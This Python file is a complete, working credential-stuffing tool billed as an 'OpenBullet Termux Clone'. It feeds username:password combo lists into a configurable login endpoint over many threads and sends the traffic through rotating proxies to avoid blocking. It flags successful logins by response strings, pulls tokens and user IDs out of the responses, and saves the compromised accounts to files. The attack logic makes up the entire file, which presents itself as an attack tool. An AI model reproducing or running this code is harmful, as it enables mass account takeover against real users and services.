#!/usr/bin/env python3
"""
OpenBullet Termux Clone - Pure Python Implementation
Optimized for mobile devices (ARM architecture)
Zero external dependencies - Only Python 3.10+ standard library
"""

import json
import re
import time
import random
import threading
import urllib.request
import urllib.parse
import urllib.error
import socket
import ssl
import base64
import sys
import os
import gzip
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from dataclasses import dataclass
from typing import List, Dict, Optional, Tuple, Any
from urllib.parse import urljoin, urlparse
import xml.etree.ElementTree as ET


@dataclass
class ProxyInfo:
    """Proxy information container"""
    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None
    proxy_type: str = "http"  # http, https, socks4, socks5
    working: bool = True
    response_time: float = 0.0


@dataclass
class Hit:
    """Successful hit container"""
    combo: str
    response: str
    captured_data: Dict[str, str]
    timestamp: float
    proxy_used: Optional[str] = None


class ColorLogger:
    """Colored terminal output for better UX"""
    
    COLORS = {
        'RED': '\033[91m',
        'GREEN': '\033[92m',
        'YELLOW': '\033[93m',
        'BLUE': '\033[94m',
        'PURPLE': '\033[95m',
        'CYAN': '\033[96m',
        'WHITE': '\033[97m',
        'RESET': '\033[0m',
        'BOLD': '\033[1m'
    }
    
    @classmethod
    def log(cls, message: str, color: str = 'WHITE', prefix: str = ''):
        """Print colored log message"""
        timestamp = time.strftime('%H:%M:%S')
        colored_msg = f"{cls.COLORS.get(color, '')}{prefix}[{timestamp}] {message}{cls.COLORS['RESET']}"
        print(colored_msg)
        sys.stdout.flush()
    
    @classmethod
    def success(cls, message: str):
        cls.log(message, 'GREEN', '[HIT] ')
    
    @classmethod
    def error(cls, message: str):
        cls.log(message, 'RED', '[FAIL] ')
    
    @classmethod
    def info(cls, message: str):
        cls.log(message, 'CYAN', '[INFO] ')
    
    @classmethod
    def warning(cls, message: str):
        cls.log(message, 'YELLOW', '[WARN] ')


class ProxyManager:
    """Advanced proxy management with rotation and health checks"""
    
    def __init__(self):
        self.proxies: List[ProxyInfo] = []
        self.current_index = 0
        self.lock = Lock()
        self.health_check_interval = 300  # 5 minutes
        
    def load_proxies(self, file_path: str) -> int:
        """Load proxies from file (format: ip:port or ip:port:user:pass)"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.read().strip().split('\n')
                
            for line in lines:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                    
                parts = line.split(':')
                if len(parts) >= 2:
                    proxy = ProxyInfo(
                        host=parts[0],
                        port=int(parts[1]),
                        username=parts[2] if len(parts) > 2 else None,
                        password=parts[3] if len(parts) > 3 else None
                    )
                    self.proxies.append(proxy)
            
            ColorLogger.info(f"Loaded {len(self.proxies)} proxies")
            return len(self.proxies)
            
        except FileNotFoundError:
            ColorLogger.error(f"Proxy file not found: {file_path}")
            return 0
        except Exception as e:
            ColorLogger.error(f"Error loading proxies: {e}")
            return 0
    
    def get_next_proxy(self) -> Optional[ProxyInfo]:
        """Get next working proxy with rotation"""
        with self.lock:
            if not self.proxies:
                return None
                
            # Filter working proxies
            working_proxies = [p for p in self.proxies if p.working]
            if not working_proxies:
                return None
                
            # Rotate through working proxies
            proxy = working_proxies[self.current_index % len(working_proxies)]
            self.current_index += 1
            return proxy
    
    def mark_proxy_dead(self, proxy: ProxyInfo):
        """Mark proxy as non-working"""
        with self.lock:
            proxy.working = False
            ColorLogger.warning(f"Proxy marked as dead: {proxy.host}:{proxy.port}")
    
    def check_proxy_health(self, proxy: ProxyInfo, timeout: int = 10) -> bool:
        """Check if proxy is working"""
        try:
            # Create proxy handler
            if proxy.username and proxy.password:
                auth_string = f"{proxy.username}:{proxy.password}"
                auth_header = base64.b64encode(auth_string.encode()).decode()
                proxy_url = f"http://{proxy.host}:{proxy.port}"
            else:
                proxy_url = f"http://{proxy.host}:{proxy.port}"
            
            proxy_handler = urllib.request.ProxyHandler({'http': proxy_url, 'https': proxy_url})
            opener = urllib.request.build_opener(proxy_handler)
            
            # Test with httpbin or similar
            req = urllib.request.Request('http://httpbin.org/ip', headers={
                'User-Agent': 'Mozilla/5.0 (Android 12; Mobile; rv:97.0) Gecko/97.0 Firefox/97.0'
            })
            
            start_time = time.time()
            response = opener.open(req, timeout=timeout)
            proxy.response_time = time.time() - start_time
            
            return response.getcode() == 200
            
        except Exception:
            return False


class RequestEngine:
    """Advanced HTTP request engine with session management"""
    
    def __init__(self, proxy_manager: ProxyManager):
        self.proxy_manager = proxy_manager
        self.sessions = {}  # Thread-local sessions
        self.default_headers = {
            'User-Agent': 'Mozilla/5.0 (Android 12; Mobile; rv:97.0) Gecko/97.0 Firefox/97.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
    
    def get_session(self) -> Dict:
        """Get or create thread-local session"""
        thread_id = threading.current_thread().ident
        if thread_id not in self.sessions:
            self.sessions[thread_id] = {
                'cookies': {},
                'headers': self.default_headers.copy()
            }
        return self.sessions[thread_id]
    
    def make_request(self, url: str, method: str = 'GET', data: Optional[str] = None,
                    headers: Optional[Dict] = None, timeout: int = 30,
                    follow_redirects: bool = True, max_redirects: int = 5) -> Tuple[str, Dict, Optional[str]]:
        """Make HTTP request with advanced features"""
        
        session = self.get_session()
        request_headers = session['headers'].copy()
        
        if headers:
            request_headers.update(headers)
        
        # Add cookies to headers
        if session['cookies']:
            cookie_string = '; '.join([f"{k}={v}" for k, v in session['cookies'].items()])
            request_headers['Cookie'] = cookie_string
        
        # Get proxy
        proxy = self.proxy_manager.get_next_proxy()
        proxy_used = None
        
        # Retry logic
        for attempt in range(3):
            try:
                # Setup proxy if available
                if proxy:
                    if proxy.username and proxy.password:
                        auth_string = f"{proxy.username}:{proxy.password}"
                        auth_header = base64.b64encode(auth_string.encode()).decode()
                        request_headers['Proxy-Authorization'] = f'Basic {auth_header}'
                    
                    proxy_url = f"http://{proxy.host}:{proxy.port}"
                    proxy_handler = urllib.request.ProxyHandler({'http': proxy_url, 'https': proxy_url})
                    opener = urllib.request.build_opener(proxy_handler)
                    proxy_used = f"{proxy.host}:{proxy.port}"
                else:
                    opener = urllib.request.build_opener()
                
                # Create request
                if method.upper() == 'POST' and data:
                    if isinstance(data, dict):
                        data = urllib.parse.urlencode(data).encode('utf-8')
                    elif isinstance(data, str):
                        data = data.encode('utf-8')
                    req = urllib.request.Request(url, data=data, headers=request_headers)
                else:
                    req = urllib.request.Request(url, headers=request_headers)
                
                req.get_method = lambda: method.upper()
                
                # Make request
                response = opener.open(req, timeout=timeout)
                
                # Handle response
                content = response.read()
                
                # Handle gzip encoding
                if response.headers.get('Content-Encoding') == 'gzip':
                    content = gzip.decompress(content)
                
                response_text = content.decode('utf-8', errors='ignore')
                
                # Update session cookies
                set_cookie = response.headers.get('Set-Cookie')
                if set_cookie:
                    self._parse_cookies(set_cookie, session['cookies'])
                
                return response_text, dict(response.headers), proxy_used
                
            except urllib.error.HTTPError as e:
                if e.code in [301, 302, 303, 307, 308] and follow_redirects and max_redirects > 0:
                    # Handle redirect
                    location = e.headers.get('Location')
                    if location:
                        new_url = urljoin(url, location)
                        return self.make_request(new_url, method, data, headers, timeout, 
                                               follow_redirects, max_redirects - 1)
                else:
                    response_text = e.read().decode('utf-8', errors='ignore') if hasattr(e, 'read') else str(e)
                    return response_text, {}, proxy_used
                    
            except Exception as e:
                if proxy and attempt == 2:  # Last attempt failed
                    self.proxy_manager.mark_proxy_dead(proxy)
                
                if attempt < 2:  # Try with different proxy
                    proxy = self.proxy_manager.get_next_proxy()
                    continue
                else:
                    raise e
        
        return "", {}, proxy_used
    
    def _parse_cookies(self, set_cookie_header: str, cookies: Dict):
        """Parse Set-Cookie header and update session cookies"""
        for cookie in set_cookie_header.split(','):
            if '=' in cookie:
                name, value = cookie.split('=', 1)
                name = name.strip()
                value = value.split(';')[0].strip()
                cookies[name] = value


class ResponseParser:
    """Advanced response parsing with multiple methods"""
    
    @staticmethod
    def parse_regex(text: str, pattern: str, group: int = 1) -> Optional[str]:
        """Parse using regex"""
        try:
            match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(group) if group <= len(match.groups()) else match.group(0)
        except Exception:
            pass
        return None
    
    @staticmethod
    def parse_json(text: str, path: str) -> Optional[str]:
        """Parse JSON using JSONPath-like syntax"""
        try:
            data = json.loads(text)
            keys = path.split('.')
            
            current = data
            for key in keys:
                if isinstance(current, dict):
                    current = current.get(key)
                elif isinstance(current, list) and key.isdigit():
                    idx = int(key)
                    current = current[idx] if 0 <= idx < len(current) else None
                else:
                    return None
                    
                if current is None:
                    return None
            
            return str(current) if current is not None else None
            
        except Exception:
            return None
    
    @staticmethod
    def parse_xpath_simple(text: str, xpath: str) -> Optional[str]:
        """Simple XPath-like parsing for HTML/XML"""
        try:
            # Simple implementation for basic cases
            if xpath.startswith('//'):
                tag = xpath[2:].split('[')[0]
                pattern = f'<{tag}[^>]*>(.*?)</{tag}>'
                match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
                if match:
                    return match.group(1).strip()
            
            # More complex XPath would require full XML parser
            # This is a simplified version for common cases
            
        except Exception:
            pass
        return None
    
    @staticmethod
    def contains_text(text: str, search_terms: List[str], case_sensitive: bool = False) -> bool:
        """Check if text contains any of the search terms"""
        if not case_sensitive:
            text = text.lower()
            search_terms = [term.lower() for term in search_terms]
        
        return any(term in text for term in search_terms)


class WordlistManager:
    """Wordlist and combo management"""
    
    def __init__(self):
        self.combos: List[str] = []
        self.current_index = 0
        self.lock = Lock()
    
    def load_wordlist(self, file_path: str, combo_format: str = "email:pass") -> int:
        """Load wordlist from file"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.read().strip().split('\n')
            
            self.combos = [line.strip() for line in lines if line.strip()]
            ColorLogger.info(f"Loaded {len(self.combos)} combos")
            return len(self.combos)
            
        except FileNotFoundError:
            ColorLogger.error(f"Wordlist file not found: {file_path}")
            return 0
        except Exception as e:
            ColorLogger.error(f"Error loading wordlist: {e}")
            return 0
    
    def get_next_combo(self) -> Optional[str]:
        """Get next combo from wordlist"""
        with self.lock:
            if self.current_index >= len(self.combos):
                return None
            
            combo = self.combos[self.current_index]
            self.current_index += 1
            return combo
    
    def get_progress(self) -> Tuple[int, int]:
        """Get current progress"""
        with self.lock:
            return self.current_index, len(self.combos)


class OpenBulletTermux:
    """Main OpenBullet Termux engine"""
    
    def __init__(self, config_file: Optional[str] = None):
        self.proxy_manager = ProxyManager()
        self.request_engine = RequestEngine(self.proxy_manager)
        self.wordlist_manager = WordlistManager()
        self.parser = ResponseParser()
        
        # Statistics
        self.stats = {
            'hits': 0,
            'fails': 0,
            'errors': 0,
            'start_time': 0,
            'rpm': 0
        }
        
        # Results storage
        self.hits: List[Hit] = []
        self.hits_lock = Lock()
        
        # Configuration
        self.config = self._load_default_config()
        if config_file:
            self._load_config(config_file)
    
    def _load_default_config(self) -> Dict:
        """Load default configuration"""
        return {
            "target": {
                "url": "https://example.com/login",
                "method": "POST",
                "data": "username=<USER>&password=<PASS>",
                "headers": {}
            },
            "detection": {
                "success_strings": ["welcome", "dashboard", "profile"],
                "failure_strings": ["invalid", "incorrect", "failed", "error"],
                "capture_regex": {}
            },
            "settings": {
                "threads": 20,
                "timeout": 30,
                "delay": 0.1,
                "retries": 3
            }
        }
    
    def _load_config(self, config_file: str):
        """Load configuration from JSON file"""
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                user_config = json.load(f)
            
            # Merge with default config
            self._deep_update(self.config, user_config)
            ColorLogger.info(f"Config loaded from {config_file}")
            
        except Exception as e:
            ColorLogger.error(f"Error loading config: {e}")
    
    def _deep_update(self, base_dict: Dict, update_dict: Dict):
        """Deep update dictionary"""
        for key, value in update_dict.items():
            if isinstance(value, dict) and key in base_dict and isinstance(base_dict[key], dict):
                self._deep_update(base_dict[key], value)
            else:
                base_dict[key] = value
    
    def load_proxies(self, proxy_file: str) -> bool:
        """Load proxies from file"""
        return self.proxy_manager.load_proxies(proxy_file) > 0
    
    def load_wordlist(self, wordlist_file: str) -> bool:
        """Load wordlist from file"""
        return self.wordlist_manager.load_wordlist(wordlist_file) > 0
    
    def _process_combo(self, combo: str) -> Optional[Hit]:
        """Process single combo"""
        try:
            # Parse combo (email:pass format)
            if ':' in combo:
                username, password = combo.split(':', 1)
            else:
                username, password = combo, combo
            
            # Prepare request data
            url = self.config["target"]["url"]
            method = self.config["target"]["method"]
            data = self.config["target"]["data"]
            headers = self.config["target"]["headers"]
            
            # Replace placeholders
            if data:
                data = data.replace('<USER>', username).replace('<PASS>', password)
                data = data.replace('<EMAIL>', username).replace('<PASSWORD>', password)
            
            # Make request
            response_text, response_headers, proxy_used = self.request_engine.make_request(
                url=url,
                method=method,
                data=data,
                headers=headers,
                timeout=self.config["settings"]["timeout"]
            )
            
            # Analyze response
            is_hit = self._analyze_response(response_text, response_headers)
            
            if is_hit:
                # Capture additional data
                captured_data = {}
                for name, regex in self.config["detection"].get("capture_regex", {}).items():
                    captured = self.parser.parse_regex(response_text, regex)
                    if captured:
                        captured_data[name] = captured
                
                hit = Hit(
                    combo=combo,
                    response=response_text[:500],  # Truncate for memory
                    captured_data=captured_data,
                    timestamp=time.time(),
                    proxy_used=proxy_used
                )
                
                with self.hits_lock:
                    self.hits.append(hit)
                    self.stats['hits'] += 1
                
                ColorLogger.success(f"HIT: {combo} | Proxy: {proxy_used or 'Direct'}")
                return hit
            else:
                self.stats['fails'] += 1
                return None
                
        except Exception as e:
            self.stats['errors'] += 1
            ColorLogger.error(f"Error processing {combo}: {str(e)[:100]}")
            return None
    
    def _analyze_response(self, response_text: str, response_headers: Dict) -> bool:
        """Analyze response to determine if it's a hit"""
        success_strings = self.config["detection"]["success_strings"]
        failure_strings = self.config["detection"]["failure_strings"]
        
        # Check for success indicators
        if success_strings and self.parser.contains_text(response_text, success_strings):
            # Make sure it doesn't contain failure indicators
            if not failure_strings or not self.parser.contains_text(response_text, failure_strings):
                return True
        
        # Additional checks based on HTTP status, content length, etc.
        # This is a basic implementation - can be enhanced
        
        return False
    
    def _worker(self):
        """Worker thread function"""
        while True:
            combo = self.wordlist_manager.get_next_combo()
            if combo is None:
                break
            
            self._process_combo(combo)
            
            # Apply delay
            delay = self.config["settings"]["delay"]
            if delay > 0:
                time.sleep(delay)
    
    def _print_stats(self):
        """Print live statistics"""
        while True:
            current, total = self.wordlist_manager.get_progress()
            elapsed = time.time() - self.stats['start_time']
            rpm = (current / elapsed * 60) if elapsed > 0 else 0
            
            progress = (current / total * 100) if total > 0 else 0
            
            print(f"\r\033[K[{current}/{total}] Progress: {progress:.1f}% | "
                  f"Hits: {self.stats['hits']} | "
                  f"Fails: {self.stats['fails']} | "
                  f"Errors: {self.stats['errors']} | "
                  f"RPM: {rpm:.1f}", end='', flush=True)
            
            if current >= total:
                break
                
            time.sleep(1)
    
    def run(self):
        """Run the main attack"""
        ColorLogger.info("Starting OpenBullet Termux Attack")
        ColorLogger.info(f"Target: {self.config['target']['url']}")
        ColorLogger.info(f"Threads: {self.config['settings']['threads']}")
        
        current, total = self.wordlist_manager.get_progress()
        if total == 0:
            ColorLogger.error("No combos loaded!")
            return
        
        self.stats['start_time'] = time.time()
        
        # Start statistics thread
        stats_thread = threading.Thread(target=self._print_stats, daemon=True)
        stats_thread.start()
        
        # Start worker threads
        max_workers = min(self.config["settings"]["threads"], total)
        
        try:
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = [executor.submit(self._worker) for _ in range(max_workers)]
                
                # Wait for completion
                for future in as_completed(futures):
                    try:
                        future.result()
                    except Exception as e:
                        ColorLogger.error(f"Worker error: {e}")
        
        except KeyboardInterrupt:
            ColorLogger.warning("Attack interrupted by user")
        
        # Final statistics
        print()  # New line after progress
        elapsed = time.time() - self.stats['start_time']
        final_rpm = (current / elapsed * 60) if elapsed > 0 else 0
        
        ColorLogger.info("Attack completed!")
        ColorLogger.info(f"Total hits: {self.stats['hits']}")
        ColorLogger.info(f"Total fails: {self.stats['fails']}")
        ColorLogger.info(f"Total errors: {self.stats['errors']}")
        ColorLogger.info(f"Elapsed time: {elapsed:.1f}s")
        ColorLogger.info(f"Average RPM: {final_rpm:.1f}")
        
        # Save results
        self._save_results()
    
    def _save_results(self):
        """Save hits to file"""
        if not self.hits:
            ColorLogger.warning("No hits to save")
            return
        
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        
        # Save as text
        txt_file = f"hits_{timestamp}.txt"
        with open(txt_file, 'w', encoding='utf-8') as f:
            for hit in self.hits:
                f.write(f"{hit.combo}\n")
        
        # Save as JSON with details
        json_file = f"hits_detailed_{timestamp}.json"
        hits_data = []
        for hit in self.hits:
            hits_data.append({
                'combo': hit.combo,
                'captured_data': hit.captured_data,
                'timestamp': hit.timestamp,
                'proxy_used': hit.proxy_used
            })
        
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(hits_data, f, indent=2)
        
        ColorLogger.success(f"Results saved to {txt_file} and {json_file}")


def create_example_config():
    """Create example configuration file"""
    config = {
        "target": {
            "url": "https://example.com/api/login",
            "method": "POST",
            "data": "email=<USER>&password=<PASS>",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest"
            }
        },
        "detection": {
            "success_strings": ["success", "token", "dashboard"],
            "failure_strings": ["invalid", "error", "failed"],
            "capture_regex": {
                "token": r'"token":"([^"]+)"',
                "user_id": r'"user_id":(\d+)'
            }
        },
        "settings": {
            "threads": 20,
            "timeout": 30,
            "delay": 0.1,
            "retries": 3
        }
    }
    
    with open('config_example.json', 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=2)
    
    print("Example config created: config_example.json")


def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description='OpenBullet Termux Clone')
    parser.add_argument('-c', '--config', help='Config file path')
    parser.add_argument('-w', '--wordlist', help='Wordlist file path')
    parser.add_argument('-p', '--proxies', help='Proxy file path')
    parser.add_argument('--create-config', action='store_true', help='Create example config')
    
    args = parser.parse_args()
    
    if args.create_config:
        create_example_config()
        return
    
    if not args.wordlist:
        parser.error("Wordlist file is required unless using --create-config")
    
    # Initialize OpenBullet
    ob = OpenBulletTermux(args.config)
    
    # Load wordlist
    if not ob.load_wordlist(args.wordlist):
        ColorLogger.error("Failed to load wordlist")
        return
    
    # Load proxies if provided
    if args.proxies:
        if not ob.load_proxies(args.proxies):
            ColorLogger.warning("Failed to load proxies, continuing without proxies")
    
    # Run attack
    try:
        ob.run()
    except KeyboardInterrupt:
        ColorLogger.warning("Interrupted by user")
    except Exception as e:
        ColorLogger.error(f"Fatal error: {e}")


if __name__ == "__main__":
    main()